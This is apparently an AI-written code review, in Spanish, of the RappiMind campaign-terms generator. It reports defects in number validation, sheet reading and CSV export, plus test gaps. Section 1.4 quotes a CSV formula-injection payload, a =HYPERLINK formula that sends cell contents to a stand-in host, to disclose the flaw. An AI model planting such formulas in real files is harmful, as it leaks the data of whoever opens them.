# Revisión de código de RappiMind

Fecha: 23 de septiembre de 2026. Revisión general del repositorio en busca de defectos.

Punto de partida: `npm test` da 728 pruebas, 720 pasan, 0 fallan y 8 se saltan.
Las 8 saltadas son legítimas: dependen de artefactos que ya no se versionan a
propósito (`docs/FRONT_ACTUAL.html` y `docs/revision/`), y el propio mensaje de
salto dice cómo generarlos.

Eso quiere decir que los defectos que queden no están donde las pruebas miran.
Están en los cruces: lo que entra por el formulario, lo que viene del Sheet y lo
que va de un módulo a otro.

**No se modificó ni una línea del proyecto.** Cada defecto de la sección 1 tiene
un reproductor que corre con `node` y no toca el repositorio.

---

## 1. Defectos confirmados

### 1.1 Un decimal entra al formulario y el documento se contradice a sí mismo

**Dónde:** `src/core/validaciones.js:135-146` y `src/core/numeros.js`.

La revisión de un campo numérico comprueba tres cosas: que sea un número, que no
baje del mínimo y que no pase del máximo. Nunca comprueba que sea entero. El
motor, en cambio, trunca con `Math.trunc` antes de escribirlo en letras.

Resultado: **47 campos numéricos de los 10 tipos de campaña** aceptan un decimal
y lo pierden en silencio. En 6 de ellos el título y el articulado acaban
diciendo cosas distintas, porque el título usa el valor crudo
(`src/core/nombres.js:110`) y la cláusula el truncado:

```
## JUMBO MT · 50.5% CASHBACK · 17 SEP 2026      el título promete 50,5%
   ...cincuenta por ciento (50%)...             la cláusula concede 50%
```

`generarTexto` devuelve `valido: true` y cero errores.

**Por qué importa:** lo explica el propio `src/core/nombres.js:9-13`. Como el
documento dice que ante una discrepancia se aplica la condición más favorable
para el usuario, un título que promete 50,5% obliga a pagar 50,5% sobre un
articulado que concede 50%. Es el mismo riesgo que hizo nacer la regla del
nombre automático, reaparecido por otra puerta.

Los seis con contradicción visible: `porcentaje` en `cashback`, `cashback_travel`,
`descuento_travel`, `descuento`, `promocao_br`, y `maxPedidos` en `cashback_day`.
En los otros 41 el decimal simplemente desaparece y el documento sale idéntico
al del valor entero, que es menos grave pero igual de silencioso.

Ninguna prueba lo cubre: no hay una sola aserción sobre decimales en `pruebas/`.

Reproductor: `repro-1-decimales.js`.

### 1.2 Una columna que le falte a la pestaña Paises publica un T&C con "undefined" adentro

**Dónde:** `src/core/numeros.js` (`formatearMiles`), y la frontera de lectura en
`src/server/Datos.js` (`leerPaises` → `objetosDe` → `filasComoObjetos`).

`filasComoObjetos` crea las llaves del país a partir de los encabezados que la
hoja tiene **de verdad**. Si la pestaña se creó antes de que existiera una
columna, esa llave no existe en el objeto y llega `undefined` al motor.
`formatearMiles` lo concatena tal cual dentro de `String.replace`, y JavaScript
escribe la palabra.

`encabezadosDeLaHoja()` sí añade las columnas que faltan, pero solo al
**escribir**. Al leer no interviene.

Este es exactamente el escenario que ya pasó dos veces en este proyecto: las
columnas `travel_*` (documentado en `pruebas/servidor.test.js:526`) y
`turbo_id_fiscal` (documentado en `src/server/Datos.js`).

Corriendo el camino completo contra los dobles de Google, con la pestaña Paises
tal como estaba antes de que existiera `separador_miles`:

```
generar() dice valido = true
documento creado en Drive y compartido: true
errores devueltos: 0
   → "un millón (1undefined000undefined000) de Créditos"
```

Son cinco columnas: `separador_miles`, `moneda_simbolo`, `moneda_nombre`,
`pais_legal` y `url_tc_creditos`.

La red de seguridad del motor (`senalesDeTextoRoto`, `src/core/motor.js:38-46`)
busca espacios dobles, paréntesis vacíos y frases partidas, pero no busca
`undefined`, `null`, `NaN` ni `[object Object]`. Por eso lo deja pasar.

Reproductor: `repro-2-hoja-vieja.js`.

### 1.3 El CSV de administración no aplana las fechas del Sheet

**Dónde:** `src/server/Api.js:556-564` (`adminSolicitudesCsv`).

Construye el CSV directamente de `leerSolicitudes()`, sin pasar por
`filasPlanas()`. Todas las demás salidas de la misma tabla sí pasan (`historial`,
`adminSolicitudes`, `adminEstado`, `estadoInicial`). La misma celda, en la misma
campaña:

```
en la pantalla de administración : "2026-09-17"
en el CSV que se descarga        : "Thu Sep 17 2026 00:00:00 GMT+0000 (...)"
```

No tumba nada, porque el CSV ya es una cadena cuando cruza a `google.script.run`.
Es el patrón de "el dato equivocado en silencio". La prueba que existe
(`pruebas/servidor.test.js:435`) no inyecta una fecha real, como sí hace la del
historial en la línea 489, así que no lo ve.

Reproductor: `repro-4-csv.js`.

### 1.4 El nombre de la tienda puede meter una fórmula en el CSV

**Dónde:** `src/core/tablas.js` (`comoCsv`).

El nombre de la tienda es texto libre y va al CSV sin prefijo de escape. Un
comercial que escriba `=HYPERLINK("http://...")` como nombre de tienda deja esa
fórmula en el archivo, y Excel o Google Sheets la ejecutan al abrirlo:

```
"=HYPERLINK(""http://malo.example/""&A1 ...
empieza por "=" sin prefijo de escape: SÍ
```

Alcance limitado: el CSV solo lo descarga alguien con rol `admin`, y todas las
cuentas son `@rappi.com`. Pero cualquier comercial puede dejar el anzuelo y el
administrador lo dispara al auditar. El arreglo es una línea en `comoCsv`.

---

## 2. Lo que parecía defecto y no lo es

Vale la pena dejarlo escrito para que la próxima revisión no lo persiga otra vez.

**Ampliar una campaña de cashback por ETA.** `src/core/ampliacion.js:49` lee
`entrada.fechaFin` en crudo, y el cashback por ETA no pregunta esa fecha: para el
módulo esa campaña nunca termina, y deja ampliarla en 2035. Pero
`src/client/js/62-pasos.js:902` rellena `fechaFin` desde el navegador al
responder la fecha de inicio, así que **hoy no es alcanzable**. Queda como
fragilidad, no como defecto: la corrección del servidor depende de que el
navegador rellene un campo que el esquema no pregunta, y `validaciones.js:186`
ya resolvió ese mismo problema con `fechaFinDeLaCampana()` sin propagarlo aquí.
Reproductor, por si se quiere cerrar: `repro-3-ampliar-eta.js`.

**Los "104 exportados muertos".** Falso positivo de la auditoría automática: la
medida contaba referencias **fuera** del propio archivo, así que marcó como
muerta toda función que se usa dentro de su módulo o a través de un despachador.
`validarTiendas` se usa en `validaciones.js:991`, `validarOrganizadorNoEsRappi`
en la 231, `vinetasDeCondicionesTravel` en `derivados_travel.js:642`, y los ocho
validadores de identificación corren vía la tabla de
`identificaciones.js:250`. Lo que la lista mide de verdad es exportación
innecesaria, no código muerto.

**`descuento_tyc_general` no es un id de `ESQUEMAS`.** Es a propósito, y está
escrito en `docs/encargos/respuestas/03-leyendas.md:899`: es un identificador
propuesto para los T&C generales, no un tipo de la herramienta.

**Tres pruebas que "pasan con lista vacía"** (`servidor.test.js:1128`,
`estilos.test.js:88`, `front.test.js:50`). Son pruebas de invariante negativa,
que es lo correcto: afirman que no hay sobrantes. Hoy sí recorren datos reales
(las confirmaciones son 6, no 0). Lo único que les falta es una aserción de
guarda que diga cuántos elementos había que revisar, para que no pasen en verde
si algún día la fuente se queda vacía por un fallo de lectura.

**Valores derivados numéricos.** Comprobé si un derivado podía valer `0` y que el
motor lo tomara por vacío (`if (!valor)` en `reemplazarPlaceholders` y
`resolverOpcionales`). No ocurre: las 111 claves derivadas son siempre texto.

---

## 3. Preguntas para Juan, que son de negocio y no de código

**3.1 Tres leyendas aprobadas están escritas y nadie las puede alcanzar.**
`leyenda_descuento_co`, `leyenda_membresia_pro_co` y la rama de descuento de
`leyenda_push_co` están marcadas con `tipo_campana: descuento_tyc_general`. Ese
camino, el de los T&C generales de Colombia, existe en la herramienta
(`src/core/tyc_genericos.js`, `src/client/js/63-tyc-genericos.js`), pero **no
llama nunca a las leyendas**: `generarLeyendasDeLaCampana` solo se invoca desde
los tres puntos del camino generativo en `Api.js`. Resultado: cuando un
comercial de Colombia resuelve un descuento con T&C general, se lleva el enlace
pero no la letra pequeña de la pieza, que ya existe escrita y aprobada.
¿Se conectan, o se quedan esperando?

**3.2 En ocho países hay categorías con leyenda aprobada que el comercial nunca
ve.** La pregunta "Categoría del producto" solo aparece si el país tiene leyenda
de campaña, y hoy solo Colombia la tiene. México tiene 5 categorías propias
catalogadas (alimentos, medicamentos, licores y demás), Argentina 2, y Perú,
Chile, Ecuador y los demás 1 cada uno. Ninguna se ofrece. El código lo documenta
como deliberado en `src/core/esquemas.js:115-120` ("un país sin leyenda de
campaña no tiene dónde pegar el complemento"), así que la pregunta es de
producto: ¿un Descuento en México debería poder llevar la leyenda de licores
aunque no haya leyenda de campaña mexicana?

---

## 4. Huecos de prueba que conviene cerrar

**4.1 Cobertura de casos: 20 de 36 combinaciones país más tipo (56%).** Las 16
sin ningún caso en `pruebas/casos_base.json`:

```
MX/cupon   PE/carrera_compras  PE/descuento   AR/carrera_compras  AR/cupon
CL/carrera_compras  CL/descuento   EC/carrera_compras  EC/descuento  EC/cupon
UY/carrera_compras  UY/descuento   UY/cupon   CR/carrera_compras  CR/descuento  CR/cupon
```

Son las que se habilitaron en la última ronda y se quedaron sin caso dorado.

**4.2 `src/server/Codigo.js` no lo carga ninguna prueba.** El arnés enumera los
seis archivos del servidor que levanta (`pruebas/dobles/entorno.js:24`) y
`Codigo.js` no está. Ahí viven `doGet` e `incluir`, que son el punto de entrada
de la web app y lo que compone los HTML. Si `incluir` se rompe, la aplicación
entera no carga y ninguna prueba lo dice. Es código pequeño y casi todo API de
Google, así que el riesgo es bajo, pero la consecuencia es total.

**4.3 La prueba del navegador no comprueba `LEYENDAS` ni `CATEGORIAS_TRAVEL`.**
`pruebas/build.test.js` ejecuta `MotorCliente.html` y verifica que existan
`MODELOS`, `PAISES_SEMILLA`, `SECCIONES`, `TYC_GENERICOS`, `ESQUEMAS` y
`PREGUNTAS`. Hoy los otros dos sí se embeben, pero los dos tienen un
`typeof X === 'undefined'` defensivo (`leyendas.js:221`, `esquemas.js:781`) que
se tragaría el fallo en silencio si un cambio del build los dejara fuera. Es el
incidente de la frontera 2 esperando a repetirse.

**4.4 `preguntaDe(` sin el tipo en `src/client/js/60-flujo.js:25, 40 y 97`.**
Comprobé las 30 variantes reales de `src/core/preguntas.js`: ninguna cambia hoy
si el enunciado existe o no, así que el resultado es idéntico con tipo o sin él.
No es un defecto activo. Pero la prueba que existe justo para esto
(`pruebas/paises_habilitados.test.js`) solo caza `preguntaDe('id_literal'`, y
aquí el identificador es dinámico, así que nunca lo vería. La primera variante
que quite un enunciado hará desaparecer o aparecer un paso entero.

---

## 5. Lo que salió limpio

Conviene decirlo, porque es la mitad del valor de una revisión.

- **Las cuatro fronteras**, salvo el punto 1.3: 0 llamadas directas entre
  archivos de `src/client/js/` sin pasar por `RM`; 0 colisiones de nombre sin
  distinguir mayúsculas en `dist/`; los 30 archivos de `src/core/` con su pie
  `module.exports`; los 8 datos embebidos en `MotorCliente.html` y ninguno
  filtrado a `App.html`; 11 de los 12 endpoints que el cliente invoca, limpios de
  fechas y objetos crudos.
- **Integridad de plantillas**: 0 `[[INCLUIR:]]` a un bloque inexistente, 0
  bloques opcionales sin cerrar, 0 marcas `{{TIENDA_*}}` fuera de su bucle, 0
  `require('./X.js').Y` donde `X.js` no exporte `Y` en todo el repositorio.
- **Catálogos**: los 10 tipos coinciden en `esquemas.js`, `paises.json` y
  `casos_base.json`; los 10 modelos existen y todos están nombrados; los 55
  archivos de leyendas producen 55 entradas de catálogo sin duplicados; los 15
  campos de `promocao_br` y los 16 de `cupom_br` están traducidos al 100%.
- **Disciplina del código**: 0 dependencias externas de npm, 0 `console.log`, 0
  `debugger`, 0 marcadores TODO o FIXME reales, y 0 sintaxis moderna en
  `src/core/` y `src/server/` (1442 `var`, ninguna función flecha), que es lo que
  Apps Script necesita.

---

## 6. Por dónde empezaría

1. **1.2**, el `undefined` en el documento. Es el único que ya terminó en un Doc
   publicado, y el arreglo tiene dos mitades: defender `formatearMiles` y añadir
   `undefined`, `null`, `NaN` y `[object Object]` a `senalesDeTextoRoto`, que es
   la frontera donde toca.
2. **1.1**, los decimales. Una línea en la revisión numérica y una prueba por
   cada uno de los seis campos que hoy se contradicen.
3. **1.4** y **1.3**, los dos del CSV, que van juntos y son de pocas líneas.
4. **3.1**, que es una decisión tuya antes que código.

---

## Dónde están los reproductores

Fuera del repositorio, en la carpeta de trabajo de esta sesión:

```
/tmp/claude-0/-home-user-rappimind-v3/b87b6390-9c4a-5d97-a15c-adddf8c38d2d/scratchpad/
   repro-1-decimales.js      el título que promete 50,5% sobre una cláusula de 50%
   repro-2-hoja-vieja.js     el T&C publicado con "undefined" adentro
   repro-3-ampliar-eta.js    la campaña de un día que nunca termina
   repro-4-csv.js            la fecha del CSV que no coincide con la pantalla
```

Cada uno corre solo con `node` y no escribe nada en el proyecto.
